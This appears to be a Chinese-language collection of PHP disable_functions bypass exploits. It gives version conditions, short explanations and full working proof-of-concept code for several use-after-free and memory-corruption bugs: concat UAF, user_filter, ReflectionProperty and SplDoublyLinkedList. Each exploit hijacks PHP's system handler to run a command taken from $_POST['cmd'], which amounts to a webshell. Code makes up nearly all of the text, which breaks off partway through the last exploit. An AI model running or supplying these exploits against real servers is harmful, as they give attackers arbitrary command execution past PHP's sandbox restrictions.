for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write                # handle pie                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec                $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                # &#x27;constant&#x27; constant check                if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                # &#x27;bin2hex&#x27; constant check                if($deref != 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123; # ELF header                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123; # system                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        # str_shuffle prevents opcache string interning        $arg = str_shuffle(str_repeat(&#x27;A&#x27;, 79));        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;        die(&#x27;This PoC is for *nix systems only.&#x27;);    &#125;    $n_alloc = 10; # increase this value if UAF fails    $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(str_repeat(&#x27;A&#x27;, 79));    trigger_uaf(&#x27;x&#x27;);    $abc = $backtrace[1][&#x27;args&#x27;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    # leaks    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#x27;t determine binary base address&quot;);    &#125;    if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#x27;t parse ELF header&quot;);    &#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#x27;t get basic_functions address&quot;);    &#125;    if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#x27;t get zif_system address&quot;);    &#125;    # fake closure object    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();&#125;



php_Concat_UAF（PHP 7.3-8.1）利用条件

Linux 操作系统
PHP7.3 - all versions to date
PHP7.4 - all versions to date
PHP8.0 - all versions to date
PHP8.1 - all versions to date

原理
此漏洞利用了处理字符串连接的函数中的错误。如果满足某些条件，诸如 $a.$b 之类的语句可能会导致内存损坏。错误报告提供了对该漏洞的非常详尽的分析
type confusion&#x2F;UAF on set_error_handler with concat operation
exp
&lt;?php# PHP 7.3-8.1 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=81705## This exploit should work on all PHP 7.3-8.1 versions# released as of 2022-01-07## Author: https://github.com/mm0r1//new Pwn(&quot;uname -a&quot;);new Pwn($_POST[&#x27;cmd&#x27;]);class Helper &#123; public $a, $b, $c; &#125;class Pwn &#123;    const LOGGING = false;    const CHUNK_DATA_SIZE = 0x60;    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;    const HT_SIZE = 0x118;    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;    public function __construct($cmd) &#123;        for($i = 0; $i &lt; 10; $i++) &#123;            $groom[] = self::alloc(self::STRING_SIZE);            $groom[] = self::alloc(self::HT_STRING_SIZE);        &#125;                $concat_str_addr = self::str2ptr($this-&gt;heap_leak(), 16);        $fill = self::alloc(self::STRING_SIZE);        $this-&gt;abc = self::alloc(self::STRING_SIZE);        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;        self::log(&quot;abc @ 0x%x&quot;, $abc_addr);        $this-&gt;free($abc_addr);        $this-&gt;helper = new Helper;        if(strlen($this-&gt;abc) &lt; 0x1337) &#123;            self::log(&quot;uaf failed&quot;);            return;        &#125;        $this-&gt;helper-&gt;a = &quot;leet&quot;;        $this-&gt;helper-&gt;b = function($x) &#123;&#125;;        $this-&gt;helper-&gt;c = 0xfeedface;        $helper_handlers = $this-&gt;rel_read(0);        self::log(&quot;helper handlers @ 0x%x&quot;, $helper_handlers);        $closure_addr = $this-&gt;rel_read(0x20);        self::log(&quot;real closure @ 0x%x&quot;, $closure_addr);        $closure_ce = $this-&gt;read($closure_addr + 0x10);        self::log(&quot;closure class_entry @ 0x%x&quot;, $closure_ce);                $basic_funcs = $this-&gt;get_basic_funcs($closure_ce);        self::log(&quot;basic_functions @ 0x%x&quot;, $basic_funcs);        $zif_system = $this-&gt;get_system($basic_funcs);        self::log(&quot;zif_system @ 0x%x&quot;, $zif_system);        $fake_closure_off = 0x70;        for($i = 0; $i &lt; 0x138; $i += 8) &#123;            $this-&gt;rel_write($fake_closure_off + $i, $this-&gt;read($closure_addr + $i));        &#125;        $this-&gt;rel_write($fake_closure_off + 0x38, 1, 4);        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;        $this-&gt;rel_write($fake_closure_off + $handler_offset, $zif_system);        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;        self::log(&quot;fake closure @ 0x%x&quot;, $fake_closure_addr);        $this-&gt;rel_write(0x20, $fake_closure_addr);        ($this-&gt;helper-&gt;b)($cmd);        $this-&gt;rel_write(0x20, $closure_addr);        unset($this-&gt;helper-&gt;b);    &#125;    private function heap_leak() &#123;        $arr = [[], []];        set_error_handler(function() use (&amp;$arr, &amp;$buf) &#123;            $arr = 1;            $buf = str_repeat(&quot;\x00&quot;, self::HT_STRING_SIZE);        &#125;);        $arr[1] .= self::alloc(self::STRING_SIZE - strlen(&quot;Array&quot;));        return $buf;    &#125;    private function free($addr) &#123;        $payload = pack(&quot;Q*&quot;, 0xdeadbeef, 0xcafebabe, $addr);        $payload .= str_repeat(&quot;A&quot;, self::HT_STRING_SIZE - strlen($payload));                $arr = [[], []];        set_error_handler(function() use (&amp;$arr, &amp;$buf, &amp;$payload) &#123;            $arr = 1;            $buf = str_repeat($payload, 1);        &#125;);        $arr[1] .= &quot;x&quot;;    &#125;    private function rel_read($offset) &#123;        return self::str2ptr($this-&gt;abc, $offset);    &#125;    private function rel_write($offset, $value, $n = 8) &#123;        for ($i = 0; $i &lt; $n; $i++) &#123;            $this-&gt;abc[$offset + $i] = chr($value &amp; 0xff);            $value &gt;&gt;= 8;        &#125;    &#125;    private function read($addr, $n = 8) &#123;        $this-&gt;rel_write(0x10, $addr - 0x10);        $value = strlen($this-&gt;helper-&gt;a);        if($n !== 8) &#123; $value &amp;= (1 &lt;&lt; ($n &lt;&lt; 3)) - 1; &#125;        return $value;    &#125;    private function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = $this-&gt;read($addr);            $f_name = $this-&gt;read($f_entry, 6);            if($f_name === 0x6d6574737973) &#123;                return $this-&gt;read($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry !== 0);    &#125;    private function get_basic_funcs($addr) &#123;        while(true) &#123;            // In rare instances the standard module might lie after the addr we&#x27;re starting            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.            // In that case, changing the direction of the search should fix the crash.            // $addr += 0x10;            $addr -= 0x10;            if($this-&gt;read($addr, 4) === 0xA8 &amp;&amp;                in_array($this-&gt;read($addr + 4, 4),                    [20180731, 20190902, 20200930, 20210902])) &#123;                $module_name_addr = $this-&gt;read($addr + 0x20);                $module_name = $this-&gt;read($module_name_addr);                if($module_name === 0x647261646e617473) &#123;                    self::log(&quot;standard module @ 0x%x&quot;, $addr);                    return $this-&gt;read($addr + 0x28);                &#125;            &#125;        &#125;    &#125;    private function log($format, $val = &quot;&quot;) &#123;        if(self::LOGGING) &#123;            printf(&quot;&#123;$format&#125;\n&quot;, $val);        &#125;    &#125;    static function alloc($size) &#123;        return str_shuffle(str_repeat(&quot;A&quot;, $size));    &#125;    static function str2ptr($str, $p = 0, $n = 8) &#123;        $address = 0;        for($j = $n - 1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p + $j]);        &#125;        return $address;    &#125;&#125;?&gt;




php7_UserFilter（PHP 7.0-8.0）利用条件

php5.* - exploitable with minor changes to the PoC
php7.0 - all versions to date
php7.1 - all versions to date
php7.2 - all versions to date
php7.3 - all versions to date
php7.4 &lt; 7.4.26
php8.0 &lt; 8.0.13

原理
Memory corruption with user_filter
exp
&lt;?php# PHP 7.0-8.0 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=54350## This exploit should work on all PHP 7.0-8.0 versions# released as of 2021-10-06## Author: https://github.com/mm0r1//pwn(&#x27;uname -a&#x27;);pwn($_POST[&#x27;cmd&#x27;]);function pwn($cmd) &#123;    define(&#x27;LOGGING&#x27;, false);    define(&#x27;CHUNK_DATA_SIZE&#x27;, 0x60);    define(&#x27;CHUNK_SIZE&#x27;, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);    define(&#x27;FILTER_SIZE&#x27;, ZEND_DEBUG_BUILD ? 0x70 : 0x50);    define(&#x27;STRING_SIZE&#x27;, CHUNK_DATA_SIZE - 0x18 - 1);    define(&#x27;CMD&#x27;, $cmd);    for($i = 0; $i &lt; 10; $i++) &#123;        $groom[] = Pwn::alloc(STRING_SIZE);    &#125;    stream_filter_register(&#x27;pwn_filter&#x27;, &#x27;Pwn&#x27;);    $fd = fopen(&#x27;php://memory&#x27;, &#x27;w&#x27;);    stream_filter_append($fd,&#x27;pwn_filter&#x27;);    fwrite($fd, &#x27;x&#x27;);&#125;class Helper &#123; public $a, $b, $c; &#125;class Pwn extends php_user_filter &#123;    private $abc, $abc_addr;    private $helper, $helper_addr, $helper_off;    private $uafp, $hfp;    public function filter($in, $out, &amp;$consumed, $closing) &#123;        if($closing) return;        stream_bucket_make_writeable($in);        $this-&gt;filtername = Pwn::alloc(STRING_SIZE);        fclose($this-&gt;stream);        $this-&gt;go();        return PSFS_PASS_ON;    &#125;    private function go() &#123;        $this-&gt;abc = &amp;$this-&gt;filtername;        $this-&gt;make_uaf_obj();        $this-&gt;helper = new Helper;        $this-&gt;helper-&gt;b = function($x) &#123;&#125;;        $this-&gt;helper_addr = $this-&gt;str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;        $this-&gt;log(&quot;helper @ 0x%x&quot;, $this-&gt;helper_addr);        $this-&gt;abc_addr = $this-&gt;helper_addr - CHUNK_SIZE;        $this-&gt;log(&quot;abc @ 0x%x&quot;, $this-&gt;abc_addr);        $this-&gt;helper_off = $this-&gt;helper_addr - $this-&gt;abc_addr - 0x18;        $helper_handlers = $this-&gt;str2ptr(CHUNK_SIZE);        $this-&gt;log(&quot;helper handlers @ 0x%x&quot;, $helper_handlers);        $this-&gt;prepare_leaker();        $binary_leak = $this-&gt;read($helper_handlers + 8);        $this-&gt;log(&quot;binary leak @ 0x%x&quot;, $binary_leak);        $this-&gt;prepare_cleanup($binary_leak);        $closure_addr = $this-&gt;str2ptr($this-&gt;helper_off + 0x38);        $this-&gt;log(&quot;real closure @ 0x%x&quot;, $closure_addr);        $closure_ce = $this-&gt;read($closure_addr + 0x10);        $this-&gt;log(&quot;closure class_entry @ 0x%x&quot;, $closure_ce);        $basic_funcs = $this-&gt;get_basic_funcs($closure_ce);        $this-&gt;log(&quot;basic_functions @ 0x%x&quot;, $basic_funcs);        $zif_system = $this-&gt;get_system($basic_funcs);        $this-&gt;log(&quot;zif_system @ 0x%x&quot;, $zif_system);        $fake_closure_off = $this-&gt;helper_off + CHUNK_SIZE * 2;        for($i = 0; $i &lt; 0x138; $i += 8) &#123;            $this-&gt;write($fake_closure_off + $i, $this-&gt;read($closure_addr + $i));        &#125;        $this-&gt;write($fake_closure_off + 0x38, 1, 4);        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;        $this-&gt;write($fake_closure_off + $handler_offset, $zif_system);        $fake_closure_addr = $this-&gt;helper_addr + $fake_closure_off - $this-&gt;helper_off;        $this-&gt;write($this-&gt;helper_off + 0x38, $fake_closure_addr);        $this-&gt;log(&quot;fake closure @ 0x%x&quot;, $fake_closure_addr);        $this-&gt;cleanup();        ($this-&gt;helper-&gt;b)(CMD);    &#125;    private function make_uaf_obj() &#123;        $this-&gt;uafp = fopen(&#x27;php://memory&#x27;, &#x27;w&#x27;);        fwrite($this-&gt;uafp, pack(&#x27;QQQ&#x27;, 1, 0, 0xDEADBAADC0DE));        for($i = 0; $i &lt; STRING_SIZE; $i++) &#123;            fwrite($this-&gt;uafp, &quot;\x00&quot;);        &#125;    &#125;    private function prepare_leaker() &#123;        $str_off = $this-&gt;helper_off + CHUNK_SIZE + 8;        $this-&gt;write($str_off, 2);        $this-&gt;write($str_off + 0x10, 6);        $val_off = $this-&gt;helper_off + 0x48;        $this-&gt;write($val_off, $this-&gt;helper_addr + CHUNK_SIZE + 8);        $this-&gt;write($val_off + 8, 0xA);    &#125;    private function prepare_cleanup($binary_leak) &#123;        $ret_gadget = $binary_leak;        do &#123;            --$ret_gadget;        &#125; while($this-&gt;read($ret_gadget, 1) !== 0xC3);        $this-&gt;log(&quot;ret gadget = 0x%x&quot;, $ret_gadget);        $this-&gt;write(0, $this-&gt;abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));        $this-&gt;write(8, $ret_gadget);    &#125;    private function read($addr, $n = 8) &#123;        $this-&gt;write($this-&gt;helper_off + CHUNK_SIZE + 16, $addr - 0x10);        $value = strlen($this-&gt;helper-&gt;c);        if($n !== 8) &#123; $value &amp;= (1 &lt;&lt; ($n &lt;&lt; 3)) - 1; &#125;        return $value;    &#125;    private function write($p, $v, $n = 8) &#123;        for($i = 0; $i &lt; $n; $i++) &#123;            $this-&gt;abc[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        &#125;    &#125;    private function get_basic_funcs($addr) &#123;        while(true) &#123;            // In rare instances the standard module might lie after the addr we&#x27;re starting            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.            // In that case, changing the direction of the search should fix the crash.            // $addr += 0x10;            $addr -= 0x10;            if($this-&gt;read($addr, 4) === 0xA8 &amp;&amp;                in_array($this-&gt;read($addr + 4, 4),                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) &#123;                $module_name_addr = $this-&gt;read($addr + 0x20);                $module_name = $this-&gt;read($module_name_addr);                if($module_name === 0x647261646e617473) &#123;                    $this-&gt;log(&quot;standard module @ 0x%x&quot;, $addr);                    return $this-&gt;read($addr + 0x28);                &#125;            &#125;        &#125;    &#125;    private function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = $this-&gt;read($addr);            $f_name = $this-&gt;read($f_entry, 6);            if($f_name === 0x6d6574737973) &#123;                return $this-&gt;read($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry !== 0);    &#125;    private function cleanup() &#123;        $this-&gt;hfp = fopen(&#x27;php://memory&#x27;, &#x27;w&#x27;);        fwrite($this-&gt;hfp, pack(&#x27;QQ&#x27;, 0, $this-&gt;abc_addr));        for($i = 0; $i &lt; FILTER_SIZE - 0x10; $i++) &#123;            fwrite($this-&gt;hfp, &quot;\x00&quot;);        &#125;    &#125;    private function str2ptr($p = 0, $n = 8) &#123;        $address = 0;        for($j = $n - 1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($this-&gt;abc[$p + $j]);        &#125;        return $address;    &#125;    private function ptr2str($ptr, $n = 8) &#123;        $out = &#x27;&#x27;;        for ($i = 0; $i &lt; $n; $i++) &#123;            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    private function log($format, $val = &#x27;&#x27;) &#123;        if(LOGGING) &#123;            printf(&quot;&#123;$format&#125;\n&quot;, $val);        &#125;    &#125;    static function alloc($size) &#123;        return str_shuffle(str_repeat(&#x27;A&#x27;, $size));    &#125;&#125;?&gt;







php7_ReflectionProperty_UAF利用条件

7.4.x 版本上进行利用，最高可利用版本为 7.4.8。

原理
Use after free when type duplicated into ReflectionProperty gets resolved
exp
最简触发脚本
&lt;?phpclass Test &#123;public stdClass $prop;&#125;$rp = new ReflectionProperty(Test::class, &#x27;prop&#x27;);$test = new Test;$test-&gt;prop = new stdClass;var_dump($rp-&gt;getType()-&gt;getName());

rce
&lt;?phpglobal $abc, $helper;class Test &#123;    public HelperHelperHelperHelperHelperHelperHelper $prop;&#125;class HelperHelperHelperHelperHelperHelperHelper &#123;    public $a, $b;&#125;function s2n($str) &#123;    $address = 0;    for ($i=0;$i&lt;4;$i++) &#123;        $address &lt;&lt;= 8;        $address |= ord($str[4 + $i]);    &#125;    return $address;&#125;function s2b($str, $offset) &#123;    return hex2bin(str_pad(dechex(s2n($str) + $offset - 0x10), 8, &quot;0&quot;,        STR_PAD_LEFT));&#125;function leak($offset) &#123;    global $abc;    $data = &quot;&quot;;    for ($i = 0;$i &lt; 8;$i++) &#123;        $data .= $abc[$offset + 7 - $i];    &#125;    return $data;&#125;function leak2($address) &#123;    global $helper;    write(0x20, $address);    $leak = strlen($helper -&gt; b);    $leak = dechex($leak);    $leak = str_pad($leak, 16, &quot;0&quot;, STR_PAD_LEFT);    $leak = hex2bin($leak);    return $leak;&#125;function write($offset, $data) &#123;    global $abc;    $data = str_pad($data, 8, &quot;\x00&quot;, STR_PAD_LEFT);    for ($i = 0;$i &lt; 8;$i++) &#123;        $abc[$offset + $i] = $data[7 - $i];    &#125;&#125;function get_basic_funcs($std_object_handlers) &#123;    $prefix = substr($std_object_handlers, 0, 4);    $std_object_handlers = hexdec(bin2hex($std_object_handlers));    $start = $std_object_handlers &amp; 0x00000000fffff000 | 0x0000000000000920;    # change 0x920 if finding failed	$NumPrefix = $std_object_handlers &amp; 0x0000ffffff000000;	$NumPrefix = $NumPrefix - 0x0000000001000000;	$funcs = get_defined_functions()[&#x27;internal&#x27;];	for ($i = 0; $i &lt; 0x1000; $i++) &#123;        $addr = $start - 0x1000 * $i;        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,                &quot;0&quot;, STR_PAD_LEFT))));        if (hexdec($name_addr) &gt; $std_object_handlers || hexdec($name_addr) &lt; $NumPrefix) &#123;            continue;        &#125;        $name_addr = str_pad($name_addr, 16, &quot;0&quot;, STR_PAD_LEFT);        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));        $name = explode(&quot;\x00&quot;, $name)[0];        if(in_array($name, $funcs)) &#123;            return [$name, bin2hex($prefix) . str_pad(dechex($addr), 8, &quot;0&quot;, STR_PAD_LEFT),                $std_object_handlers, $NumPrefix];        &#125;    &#125;&#125;function getSystem($unknown_func) &#123;    $unknown_addr = hex2bin($unknown_func[1]);    $prefix = substr($unknown_addr, 0, 4);    $unknown_addr = hexdec($unknown_func[1]);    $start = $unknown_addr &amp; 0x00000000ffffffff;    for ($i = 0;$i &lt; 0x800;$i++) &#123;        $addr = $start - 0x20 * $i;        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,                &quot;0&quot;, STR_PAD_LEFT))));        if (hexdec($name_addr) &gt; $unknown_func[2] || hexdec($name_addr) &lt;            $unknown_func[3]) &#123;            continue;        &#125;        $name_addr = str_pad($name_addr, 16, &quot;0&quot;, STR_PAD_LEFT);        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));        if(strstr($name, &quot;system&quot;)) &#123;            return bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10 + 0x08), 8,                    &quot;0&quot;, STR_PAD_LEFT))));        &#125;    &#125;    for ($i = 0;$i &lt; 0x800;$i++) &#123;        $addr = $start + 0x20 * $i;        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,                &quot;0&quot;, STR_PAD_LEFT))));        if (hexdec($name_addr) &gt; $unknown_func[2] || hexdec($name_addr) &lt;            $unknown_func[3]) &#123;            continue;        &#125;        $name_addr = str_pad($name_addr, 16, &quot;0&quot;, STR_PAD_LEFT);        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));        if(strstr($name, &quot;system&quot;)) &#123;            return bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10 + 0x08), 8,                    &quot;0&quot;, STR_PAD_LEFT))));        &#125;    &#125;&#125;$rp = new ReflectionProperty(Test::class, &#x27;prop&#x27;);$test = new Test;$test -&gt; prop = new HelperHelperHelperHelperHelperHelperHelper;$abc = $rp -&gt; getType() -&gt; getName();$helper = new HelperHelperHelperHelperHelperHelperHelper();if (strlen($abc) &lt; 1000) &#123;    exit(&quot;UAF Failed!&quot;);&#125;$helper -&gt; a = $helper;$php_heap = leak(0x10);$helper -&gt; a = function($x) &#123;&#125;;$std_object_handlers = leak(0x0);$prefix = substr($php_heap, 0, 4);echo &quot;Helper Object Address: &quot; . bin2hex($php_heap) . &quot;\n&quot;;echo &quot;std_object_handlers Address: &quot; . bin2hex($std_object_handlers) . &quot;\n&quot;;$closure_object = leak(0x10);echo &quot;Closure Object: &quot; . bin2hex($closure_object) . &quot;\n&quot;;write(0x28, &quot;\x06&quot;);if(!($unknown_func = get_basic_funcs($std_object_handlers))) &#123;    die(&quot;Couldn&#x27;t determine funcs address&quot;);&#125;echo &quot;Find func&#x27;s adress: &quot; . $unknown_func[1] . &quot; -&gt; &quot; . $unknown_func[0] .    &quot;\n&quot;;if(!($system_address = getSystem($unknown_func))) &#123;    die(&quot;Couldn&#x27;t determine system address&quot;);&#125;echo &quot;Find system&#x27;s handler: &quot; . $system_address . &quot;\n&quot;;for ($i = 0;$i &lt; (0x130 / 0x08);$i++) &#123;    write(0x308 + 0x08 * ($i + 1), leak2($prefix . s2b($closure_object, 0x08 *            $i)));&#125;$abc[0x308 + 0x40] = &quot;\x01&quot;;write(0x308 + 0x70, hex2bin($system_address));write(0x10, $prefix . hex2bin(dechex(s2n($php_heap) + 0x18 + 0x308 + 0x08)));echo &quot;Fake Closure Object Address: &quot; . bin2hex($prefix .        hex2bin(str_pad(dechex(s2n($php_heap) + 0x18 + 0x308 + 0x08), 8, &quot;0&quot;,            STR_PAD_LEFT))) . &quot;\n&quot;;($helper -&gt; a)(&quot;id&quot;);



php7_SplDoublyLinkedList UAF利用条件

PHP v7.4.10及其之前版本
PHP v8.0（Alpha）


如果限制了 openbase_dir ，则需要进行爆破，而且爆破还会导致进程崩溃

原理
PHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等
通过UAF bypass PHP disabled functionsPHP SplDoublyLinkedList中的用后释放漏洞分析PHP SplDoublyLinkedList::offsetUnset UAF Sandbox Escape
exp
&lt;?phperror_reporting(0);$a = str_repeat(&quot;T&quot;, 120 * 1024 * 1024);function i2s(&amp;$a, $p, $i, $x = 8) &#123;    for($j = 0;$j &lt; $x;$j++) &#123;        $a[$p + $j] = chr($i &amp; 0xff);        $i &gt;&gt;= 8;    &#125;&#125;function s2i($s) &#123;    $result = 0;    for ($x = 0;$x &lt; strlen($s);$x++) &#123;        $result &lt;&lt;= 8;        $result |= ord($s[$x]);    &#125;    return $result;&#125;function leak(&amp;$a, $address) &#123;    global $s;    i2s($a, 0x00, $address - 0x10);    return strlen($s -&gt; current());&#125;function getPHPChunk($maps) &#123;    $pattern = &#x27;/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /&#x27;;    preg_match_all($pattern, $maps, $match);    foreach ($match[1] as $value) &#123;        list($start, $end) = explode(&quot;-&quot;, $value);        if (($length = s2i(hex2bin($end)) - s2i(hex2bin($start))) &gt;= 0x200000 &amp;&amp; $length &lt;= 0x300000) &#123;            $address = array(s2i(hex2bin($start)), s2i(hex2bin($end)), $length);            echo &quot;[+]PHP Chunk: &quot; . $start . &quot; - &quot; . $end . &quot;, length: 0x&quot; . dechex($length) . &quot;\n&quot;;            return $address;        &#125;    &#125;&#125;function bomb1(&amp;$a) &#123;    if (leak($a, s2i($_GET[&quot;test1&quot;])) === 0x5454545454545454) &#123;        return (s2i($_GET[&quot;test1&quot;]) &amp; 0x7ffff0000000);    &#125;else &#123;        die(&quot;[!]Where is here&quot;);    &#125;&#125;function bomb2(&amp;$a) &#123;    $start = s2i($_GET[&quot;test2&quot;]);    return getElement($a, array($start, $start + 0x200000, 0x200000));    die(&quot;[!]Not Found&quot;);&#125;function getElement(&amp;$a, $address) &#123;    for ($x = 0;$x &lt; ($address[2] / 0x1000 - 2);$x++) &#123;        $addr = 0x108 + $address[0] + 0x1000 * $x + 0x1000;        for ($y = 0;$y &lt; 5;$y++) &#123;            if (leak($a, $addr + $y * 0x08) === 0x1234567812345678 &amp;&amp; ((leak($a, $addr + $y * 0x08 - 0x08) &amp; 0xffffffff) === 0x01))&#123;                echo &quot;[+]SplDoublyLinkedList Element: &quot; . dechex($addr + $y * 0x08 - 0x18) . &quot;\n&quot;;                return $addr + $y * 0x08 - 0x18;            &#125;        &#125;    &#125;&#125;function getClosureChunk(&amp;$a, $address) &#123;    do &#123;        $address = leak($a, $address);    &#125;while(leak($a, $address) !== 0x00);    echo &quot;[+]Closure Chunk: &quot; . dechex($address) . &quot;\n&quot;;    return $address;&#125;function getSystem(&amp;$a, $address) &#123;    $start = $address &amp; 0xffffffffffff0000;    $lowestAddr = ($address &amp; 0x0000fffffff00000) - 0x0000000001000000;    for($i = 0; $i &lt; 0x1000 * 0x80; $i++) &#123;        $addr = $start - $i * 0x20;        if ($addr &lt; $lowestAddr) &#123;            break;        &#125;        $nameAddr = leak($a, $addr);        if ($nameAddr &gt; $address || $nameAddr &lt; $lowestAddr) &#123;            continue;        &#125;        $name = dechex(leak($a, $nameAddr));        $name = str_pad($name, 16, &quot;0&quot;, STR_PAD_LEFT);        $name = strrev(hex2bin($name));        $name = explode(&quot;\x00&quot;, $name)[0];        if($name === &quot;system&quot;) &#123;            return leak($a, $addr + 0x08);        &#125;    &#125;&#125;class Trigger &#123;    function __destruct() &#123;        global $s;        unset($s[0]);        $a = str_shuffle(str_repeat(&quot;T&quot;, 0xf));        i2s($a, 0x00, 0x1234567812345678);        i2s($a, 0x08, 0x04, 7);        $s -&gt; current();        $s -&gt; next();        if ($s -&gt; current() !== 0x1234567812345678) &#123;             die(&quot;[!]UAF Failed&quot;);        &#125;        $maps = file_get_contents(&quot;/proc/self/maps&quot;);        if (!$maps) &#123;            cantRead($a);        &#125;else &#123;            canRead($maps, $a);        &#125;        echo &quot;[+]Done&quot;;    &#125;&#125;function bypass($elementAddress, &amp;$a) &#123;    global $s;    if (!$closureChunkAddress = getClosureChunk($a, $elementAddress)) &#123;        die(&quot;[!]Get Closure Chunk Address Failed&quot;);    &#125;    $closure_object = leak($a, $closureChunkAddress + 0x18);    echo &quot;[+]Closure Object: &quot; . dechex($closure_object) . &quot;\n&quot;;    $closure_handlers = leak($a, $closure_object + 0x18);    echo &quot;[+]Closure Handler: &quot; . dechex($closure_handlers) . &quot;\n&quot;;    if(!($system_address = getSystem($a, $closure_handlers))) &#123;        die(&quot;[!]Couldn&#x27;t determine system address&quot;);    &#125;    echo &quot;[+]Find system&#x27;s handler: &quot; . dechex($system_address) . &quot;\n&quot;;    i2s($a, 0x08, 0x506, 7);    for ($i = 0;$i &lt; (0x130 / 0x08);$i++) &#123;        $data = leak($a, $closure_object + 0x08 * $i);        i2s($a, 0x00, $closure_object + 0x30);        i2s($s -&gt; current(), 0x08 * $i + 0x100, $data);    &#125;    i2s($a, 0x00, $closure_object + 